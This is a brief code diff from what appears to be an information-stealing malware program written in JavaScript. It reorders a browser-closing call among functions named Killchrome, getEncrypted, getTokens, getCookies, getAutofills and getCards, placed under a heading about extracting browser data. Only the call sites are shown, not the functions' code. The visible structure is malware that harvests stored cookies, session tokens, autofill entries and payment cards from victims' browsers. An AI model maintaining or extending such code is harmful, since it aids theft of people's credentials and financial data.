@@ -4057,7 +4057,6 @@ function executeCommand() {
 
 // Browser Functions
 function manageBrowsers() {
-    closeBrowsers();
     Killchrome();
     getEncrypted();
     getTokens();
@@ -4076,6 +4075,7 @@ function games() {
 
 // Browsers Data Extractions
 function browsers() {
+    closeBrowsers();
     getCookies();
     getAutofills();
     getCards();
